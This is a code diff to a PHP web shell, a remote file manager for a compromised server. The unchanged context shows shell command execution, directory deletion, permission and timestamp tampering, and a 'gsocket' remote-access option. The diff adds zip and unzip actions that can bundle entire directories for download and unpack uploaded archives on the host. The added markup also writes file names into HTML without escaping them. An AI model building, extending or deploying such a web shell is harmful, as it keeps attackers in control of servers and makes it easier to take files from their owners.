@@ -1022,6 +1022,60 @@ switch ($_POST['go']) {
                         $msg = deltree($deldir) ? '<h2>Delete directory ' . $_POST['var'] . ' Success</h2>' : '<h1>Delete directory ' . $_POST['var'] . ' failure</h1>';
                     }
                     break;
+                case "zip":
+                    if (empty($_POST['files'])) {
+                        $msg = '<h1>Please select files/dirs to compress</h1>';
+                    } else {
+                        $zipname = (isset($_POST['var']) && $_POST['var'] !== '') ? $_POST['var'] : ('archive_' . date('YmdHis') . '.zip');
+                        if (!preg_match('/\.zip$/i', $zipname)) $zipname .= '.zip';
+                        $zippath = strdir($nowdir . $zipname);
+                        if (class_exists('ZipArchive')) {
+                            $zip = new ZipArchive();
+                            if ($zip->open($zippath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
+                                foreach ($_POST['files'] as $entry) {
+                                    $ep = strdir($nowdir . $entry);
+                                    if (is_dir($ep)) {
+                                        $rit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($ep, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
+                                        foreach ($rit as $fi) {
+                                            $fp = $fi->getRealPath();
+                                            $rel = $entry . '/' . str_replace('\\', '/', substr($fp, strlen(rtrim($ep, '/\\')) + 1));
+                                            $zip->addFile($fp, $rel);
+                                        }
+                                    } elseif (is_file($ep)) {
+                                        $zip->addFile($ep, $entry);
+                                    }
+                                }
+                                $zip->close();
+                                $msg = '<h2>Compressed to ' . htmlspecialchars($zipname) . ' Success</h2>';
+                            } else {
+                                $msg = '<h1>Cannot create zip file</h1>';
+                            }
+                        } else {
+                            $args = implode(' ', array_map('escapeshellarg', $_POST['files']));
+                            $res = command('cd ' . escapeshellarg($nowdir) . ' && zip -r ' . escapeshellarg($zipname) . ' ' . $args, $nowdir);
+                            $msg = file_exists($zippath) ? '<h2>Compressed to ' . htmlspecialchars($zipname) . ' Success</h2>' : '<h1>Compress failed: ' . htmlspecialchars((string)$res['res']) . '</h1>';
+                        }
+                    }
+                    break;
+                case "unzip":
+                    $uzfile = strdir($nowdir . $_POST['var']);
+                    if (!file_exists($uzfile)) {
+                        $msg = '<h1>File not found: ' . htmlspecialchars($_POST['var']) . '</h1>';
+                    } elseif (class_exists('ZipArchive')) {
+                        $zip = new ZipArchive();
+                        $zr = $zip->open($uzfile);
+                        if ($zr === true) {
+                            $zip->extractTo($nowdir);
+                            $zip->close();
+                            $msg = '<h2>Extracted ' . htmlspecialchars($_POST['var']) . ' Success</h2>';
+                        } else {
+                            $msg = '<h1>Cannot open zip (code ' . $zr . ')</h1>';
+                        }
+                    } else {
+                        $res = command('cd ' . escapeshellarg($nowdir) . ' && unzip -o ' . escapeshellarg($_POST['var']), $nowdir);
+                        $msg = (strpos((string)$res['res'], 'inflating') !== false || strpos((string)$res['res'], 'extracting') !== false) ? '<h2>Extracted ' . htmlspecialchars($_POST['var']) . ' Success</h2>' : '<h1>Extract failed: ' . htmlspecialchars((string)$res['res']) . '</h1>';
+                    }
+                    break;
             }
         }
         $chmod = substr(decoct(fileperms($nowdir)), -4);
@@ -1077,7 +1131,7 @@ switch ($_POST['go']) {
                 $ctime = date('Y-m-d H:i:s', filectime($path));
                 $mtime = date('Y-m-d H:i:s', filemtime($path));
                 echo '<tr>';
-                echo '<td><a href="javascript:void(0);" onclick="cd(\'' . $nowdir . $name . '\');"><b>' . strtr($name, array('%27' => '\'', '%22' => '"')) . '</b></a></td>';
+                echo '<td><input type="checkbox" name="files[]" value="' . $name . '"><a href="javascript:void(0);" onclick="cd(\'' . $nowdir . $name . '\');"><b>' . strtr($name, array('%27' => '\'', '%22' => '"')) . '</b></a></td>';
                 echo '<td><a href="javascript:void(0);" onclick="acts(\'' . $prem . '\',\'pd\',\'' . $name . '\');">' . $prem . '</a></td>';
                 echo '<td>' . $ctime . '</td>';
                 echo '<td>' . $mtime . '</td>';
@@ -1099,7 +1153,11 @@ switch ($_POST['go']) {
                 echo '<td>' . $mtime . '</td>';
                 echo '<td align="right"><a href="javascript:void(0);" onclick="go(\'down\',\'' . $name . '\');">' . $size . '</a></td>';
                 echo '<td><a target="_blank" href="' . $thisurl . $name . '">View</a> ';
-                echo ' | <a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">Ren</a></td>';
+                echo ' | <a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">Ren</a>';
+                if (preg_match('/\.zip$/i', $name)) {
+                    echo ' | <a href="javascript:void(0);" onclick="unzipf(\'' . addslashes($name) . '\');">Unzip</a>';
+                }
+                echo '</td>';
                 echo '</tr>';
                 $fnum++;
             }
@@ -1112,7 +1170,9 @@ switch ($_POST['go']) {
         echo '<input type="button" value="Delete" style="width:50px;" onclick=\'dels("b");\'> ';
         echo '<input type="button" value="Perm" style="width:50px;" onclick=\'txts("Change Permission","0666","c");\'> ';
         echo '<input type="button" value="Time" style="width:50px;" onclick=\'txts("Change the time","' . $mtime . '","d");\'> ';
+        echo '<input type="button" value="Zip" style="width:50px;" onclick="zipsel();"> ';
         echo 'Total dir[' . $dnum . '] - Total file[' . $fnum . '] - Permission[' . $chmod . ']</div></form>';
+        echo '<script>function zipsel(){var n=prompt("ZIP filename (blank=auto)","");if(n===null)return;$("var").value=n;$("act").value="zip";$("frm1").submit();}function unzipf(f){if(confirm("Extract "+f+" to current directory?")){$("var").value=f;$("act").value="unzip";$("frm1").submit();}}</script>';
         break;
     case "gsocket":
         if ($win) {
